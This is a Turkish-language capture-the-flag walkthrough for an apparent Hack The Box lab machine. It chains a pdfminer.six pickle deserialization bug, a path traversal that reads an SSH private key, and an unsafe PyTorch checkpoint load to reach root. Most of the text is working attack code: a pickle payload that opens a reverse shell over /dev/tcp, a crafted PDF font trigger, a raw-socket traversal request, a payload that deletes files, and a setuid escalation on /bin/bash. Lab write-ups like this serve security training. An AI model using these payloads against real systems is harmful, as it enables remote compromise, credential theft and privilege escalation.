@@ -1,1 +1,231 @@
+1. Nmap → research.bedside.htb keşfedildi (port 80, PDF upload sayfası)
+2. CVE-2025-64512 → pdfminer.six pickle deserialization → datawrangler shell (Docker)
+3. Port 3000 path traversal → developer SSH private key okundu
+4. SSH → developer@bedside → user.txt alındı
+5. CVE payload ile /datastore/ içine malicious checkpoint yerleştirildi
+6. sudo trainer → torch.load() unsafe pickle → chmod u+s /bin/bash
+7. /bin/bash -p → root → root.txt alındı
 
+Nmap taraması:
+    nmap -sV -sC -p- 10.129.37.108
+
+  Açık portlar:
+    22/tcp  → SSH (OpenSSH)
+    80/tcp  → HTTP (Apache)
+
+  /etc/hosts dosyasına ekle:
+    echo "10.129.37.108  bedside.htb research.bedside.htb" >> /etc/hosts
+
+  research.bedside.htb sitesi bir PDF upload formu sunuyor.
+  HTTP başlığında: X-Powered-By: pdfminer.six
+
+  Upload dizini: /var/www/research.bedside.htb/uploads/
+  İzin verilen uzantılar: pdf, jpeg, jpg, png, bmp, tiff, dcm, gz, zip
+
+  Arka planda çalışan kritik proses:
+    python3 pdf_watcher.py (PID: 1647, datawrangler kullanıcısı)
+    Yüklenen PDF dosyalarını pdfminer ile işliyor
+    çıkarılan metni /datastore/staging/ dizinine kaydediyor
+  AÇIK NASIL ÇALIŞIYOR:
+  ─────────────────────
+  pdfminer, PDF içindeki Type0 font nesnelerinin /Encoding alanını okur.
+  Bu alanı CMapDB._load_data(name) fonksiyonuna geçirir.
+
+  Savunmasız kod (pdfminer/cmapdb.py):
+    filename = "%s.pickle.gz" % name
+    path = os.path.join(directory, filename)
+    # Eğer name = "/var/www/.../exploit2" ise:
+    # os.path.join("/usr/share/pdfminer/", "/var/www/.../exploit2.pickle.gz")
+    # = "/var/www/.../exploit2.pickle.gz"  ← absolute path kazandı!
+    gzfile = gzip.open(path)
+    pickle.loads(gzfile.read())  # RCE!
+
+  Yani: /Encoding alanına kendi pickle.gz dosyamızın absolute path'ini koyarsak
+  pdfminer onu açıp pickle.loads() ile çalıştırıyor.
+
+  EXPLOIT ADIMLARI:
+  ─────────────────
+  1) Malicious pickle.gz oluştur:
+
+    import pickle, gzip, os
+
+    class Payload:
+        def __reduce__(self):
+            return (os.system, ('bash -i >& /dev/tcp/kendiTUN0_IP/4444 0>&1',))
+
+    with gzip.open('exploit.pickle.gz', 'wb') as f:
+        f.write(pickle.dumps(Payload()))
+
+  2) exploit.pickle.gz'yi upload et:
+    → http://research.bedside.htb/ üzerinden yükle
+    → Dosya /var/www/research.bedside.htb/uploads/exploit.pickle.gz olarak kaydedilir
+
+  3) Trigger PDF oluştur:
+    PDF içindeki /Encoding değeri = /var/www/research.bedside.htb/uploads/exploit
+    (/ karakteri #2F olarak encode edilmeli)
+
+    Font nesnesi:
+      4 0 obj
+      << /Type /Font /Subtype /Type0
+         /BaseFont /ArialMT
+         /Encoding /#2Fvar#2Fwww#2Fresearch.bedside.htb#2Fuploads#2Fexploit
+         /DescendantFonts [6 0 R]
+      >>
+      endobj
+
+  4) Trigger PDF'yi yükle:
+    → pdf_watcher.py bunu işleyince pdfminer /Encoding'i okur
+    → pickle.loads() → __reduce__ → reverse shell!
+
+  5) Kali'de listener aç:
+    nc -lvnp 4444
+
+  Shell düştüğünde: datawrangler kullanıcısı, Docker container içi
+
+  Container içinde port 3000'de esm.sh Node.js dev server çalışıyor.
+  Bu sunucu /vendor/ dizinini serve ediyor ama URL normalizasyonu yapmıyor.
+
+  Normal istek:   GET /vendor/react.js
+  Traversal:      GET /vendor/../../../../../home/developer/.ssh/id_rsa
+
+  Sunucu raw socket üzerinden kandırılıyor (HTTP kütüphaneleri URL'yi normalize eder):
+
+    python3 << 'EOF'
+    import socket
+    s = socket.socket()
+    s.connect(('127.0.0.1', 3000))
+    s.send(b'GET /vendor/../../../../../home/developer/.ssh/id_rsa HTTP/1.0\r\nHost: localhost\r\n\r\n')
+    print(s.recv(8192).decode())
+    s.close()
+    EOF
+
+  SSH key alındı → dosyaya kaydet → bağlan:
+
+    chmod 600 developer_key
+    ssh -i developer_key developer@10.129.37.108
+
+    cat ~/user.txt
+    → *  ✓ USER FLAG!
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+  ADIM 4 — SUDO ENUMERATION
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+  developer@bedside:~$ sudo -l
+
+  Çıktı:
+    (ALL) NOPASSWD: /usr/bin/python3 /opt/trainer/bedside_trainer.py
+
+  bedside_trainer.py ne yapıyor?
+    1. /datastore/processed/ içindeki dosyaları MONAI ile yükler
+    2. Bir PyTorch modeli eğitir
+    3. /datastore/checkpoints/*.pt dosyası varsa torch.load() ile yükler
+    4. ROOT olarak çalışıyor!
+
+  /datastore/ → Docker volume, datawrangler (container) yazabilir, root okuyabilir.
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+  ADIM 5 — PRIVILEGE ESCALATION (PyTorch Unsafe Deserialization)
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+  AÇIK NASIL ÇALIŞIYOR:
+  ─────────────────────
+  torch.load() iki modda çalışır:
+    1. Yeni format: ZIP başlığı var → weights_only koruması devreye girer
+    2. Eski format: ZIP başlığı YOK → _legacy_load() kullanır → pickle.load() direkt!
+
+  Protocol=2 ile oluşturulan pickle dosyaları ZIP başlığı içermez.
+  Bu yüzden torch.load() _legacy_load()'u çağırır ve __reduce__ metodu tetiklenir.
+
+  MONAI CheckpointLoader da aynı şekilde torch.load() kullanır — aynı açık geçerli.
+
+  SORUN: /datastore/processed/ içinde 200 adet .txt dosyası var.
+  MONAI bunları yüklemeye çalışıyor ama görüntü formatı değil, crash ediyor.
+  Checkpoint yüklenemiyor çünkü daha önce crash oluyor!
+
+  ÇÖZÜM: CVE payload'u şunları yapacak (hepsi container içinde, datawrangler olarak):
+    a) /datastore/processed/*.txt dosyalarını sil
+    b) Geçerli bir .npy görüntü dosyası yaz (MONAI okuyabilsin)
+    c) Malicious checkpoint.pt yaz (trainer yükleyince root yetkisiyle çalışır)
+
+  TAM PAYLOAD (CVE exploit içinde çalışacak kod):
+  ──────────────────────────────────────────────
+    import os, base64, pickle, glob
+
+    # txt dosyalarını temizle
+    for f in glob.glob('/datastore/processed/*.txt'):
+        os.remove(f)
+
+    # 8x8 float32 numpy array (MONAI'nin okuyabileceği geçerli görüntü)
+    NPY_B64 = 'k05VTVBZAQB2AHsnZGVzY3InOiAnPGY0JywgJ2ZvcnRyYW5fb3JkZXInOiB' \
+              'GYWxzZSwgJ3NoYXBlJzogKDgsIDgpLCB9ICAgICAgICAgICAgICAgICAgICAg' \
+              'ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAoAAAAAAAAAAAA' \
+              'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA' \
+              'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA' \
+              'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA' \
+              'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA' \
+              'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'
+    with open('/datastore/processed/test.npy', 'wb') as f:
+        f.write(base64.b64decode(NPY_B64))
+
+    # Malicious checkpoint — eski pickle formatı (protocol=2 = ZIP başlığı yok)
+    class Exploit:
+        def __reduce__(self):
+            return (os.system, ('chmod u+s /bin/bash',))
+
+    with open('/datastore/checkpoints/checkpoint_epoch_999.pt', 'wb') as f:
+        pickle.dump({'epoch': 1, 'model': Exploit(), 'optimizer': {}}, f, protocol=2)
+
+  Bu kodu CVE-2025-64512 üzerinden tetiklemek için:
+
+    class FileDrop:
+        def __reduce__(self):
+            return (exec, (YUKARDAKI_KOD,))  # exec() ile doğrudan çalıştır
+
+    payload = pickle.dumps(FileDrop())
+    # Bunu gzip ile sıkıştır → exploit2.pickle.gz olarak yükle
+
+  Sonra doğru path'i gösteren trigger PDF yükle:
+    /Encoding = /#2Fvar#2Fwww#2Fresearch.bedside.htb#2Fuploads#2Fexploit2
+
+  pdf_watcher.py bunu işleyince her şey otomatik kurulur.
+
+  TRAINER'I ÇALIŞTIR:
+  ───────────────────
+    developer@bedside:~$ sudo /usr/bin/python3 /opt/trainer/bedside_trainer.py
+    # Trainer checkpoint'i yükler → torch.load() → _legacy_load() → pickle.load()
+    # → __reduce__ → os.system('chmod u+s /bin/bash') → ROOT!
+
+    ls -la /bin/bash
+    # -rwsr-xr-x ← SUID biti geldi!
+
+    /bin/bash -p -c 'cat /root/root.txt'
+    # *  ✓ ROOT FLAG!
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+  KRİTİK DETAYLAR VE HATALAR
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+  HATA 1 — Yanlış upload path
+    Sorun: Trigger PDF'nin /Encoding'i farklı bir path gösteriyordu
+    Düzeltme: Apache config okundu (path traversal ile), gerçek DocumentRoot
+              /var/www/research.bedside.htb/ olarak tespit edildi
+
+  HATA 2 — Pickle.gz sonra yüklendi
+    Sorun: Trigger PDF önce yüklendi, pickle.gz henüz yoktu
+           pdfminer CMapNotFound hatası verdi ve geçti
+    Düzeltme: Önce pickle.gz → sonra trigger PDF sırası zorunlu
+
+  HATA 3 — .txt dosyaları MONAI'yi crash etti
+    Sorun: /datastore/processed/ içinde 200 txt dosyası vardı
+           MONAI "LoadImaged: cannot find suitable reader for .txt" hatası verdi
+           Trainer checkpoint yükleme adımına hiç ulaşamıyordu
+    Düzeltme: Payload içine txt sil + npy oluştur adımları eklendi
+
+  HATA 4 — torch.save() yerine pickle.dump() kullanılmalı
+    Sorun: torch.save() ZIP formatında kaydeder → weights_only koruması devreye girer
+    Düzeltme: pickle.dump(..., protocol=2) kullanıldı → ZIP başlığı yok → bypass!
+
+  HATA 5 — PHP app pdfminer çağırmıyor
+    Sorun: X-Powered-By: pdfminer.six başlığı yanıltıcı, PHP sadece dosya kaydediyor
+    Gerçek: pdfminer'ı arka planda pdf_watcher.py (PID 1647) çağırıyor
